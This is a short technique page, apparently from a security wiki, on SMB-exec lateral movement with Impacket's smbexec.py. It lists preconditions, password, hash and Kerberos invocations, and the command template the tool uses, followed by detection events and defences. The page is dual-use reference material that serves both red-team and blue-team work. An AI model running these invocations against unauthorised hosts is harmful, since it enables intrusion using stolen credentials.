---
title: SMB exec
slug: smb-exec
---

> **TL;DR:** SMB-exec drives the service-control pipe (`\PIPE\svcctl`) over SMB to start a one-shot service that runs your command and pipes output back through a share — the no-binary-on-disk cousin of [[psexec-family]].

## What it is
Instead of uploading a service executable, `smbexec` registers a service whose `binPath` is a `cmd.exe /Q /c` invocation that writes output to a file on `C$`, then reads that file back over SMB. Each command spawns a new short-lived service, deletes the file, and tears the service down. No binary touches disk on the target, but `services.exe → cmd.exe` parent chains and 7045 events are still produced.

## Preconditions / where it applies
- Local administrator on the target (service create requires `SC_MANAGER_CREATE_SERVICE`).
- 445/tcp reachable, `ADMIN$` and `C$` enabled.
- NTLM hash, Kerberos ticket, or password for an admin account.
- `cmd.exe` available (default on every Windows install).

## Technique
Impacket invocation:

```
# password
smbexec.py corp/admin:'Passw0rd!'@10.0.0.5
# hash
smbexec.py -hashes :<NThash> corp/admin@10.0.0.5
# kerberos / overpass-the-hash
smbexec.py -k -no-pass corp.local/admin@fs01
```

Under the hood, each typed command is wrapped roughly as:

```
%COMSPEC% /Q /c echo <cmd> ^> \\127.0.0.1\C$\__output 2^>^&1 > %TEMP%\execute.bat & %COMSPEC% /Q /c %TEMP%\execute.bat & del %TEMP%\execute.bat
```

The service is then deleted and `\\target\C$\__output` is read for the result. Output is semi-interactive — fine for `whoami`, painful for `powershell -nop` (no persistent session). For a persistent shell use [[wmi-exec]] or [[winrm-exec]] instead.

## Detection and defence
- 7045 service install events with `binPath` containing `%COMSPEC%`, `/Q /c`, or `echo ... ^>` — extremely high-signal for smbexec.
- 5145 file-share events writing/reading `__output` (default Impacket filename — operators rename it).
- `services.exe` spawning `cmd.exe` with redirection to `\\127.0.0.1\C$` — Sysmon EID 1 query.
- Defences: enforce SMB signing, restrict service-create to Tier-0, LAPS for local admin, EDR rules on `services.exe → cmd.exe` with redirection.

## References
- [Impacket smbexec.py source](https://github.com/fortra/impacket/blob/master/examples/smbexec.py) — exact command template.
- [smbexec writeup — HackTricks](https://book.hacktricks.wiki/en/windows-hardening/lateral-movement/smbexec.html) — flow diagram.
- [Detecting Impacket smbexec — Red Canary](https://redcanary.com/) — telemetry patterns.
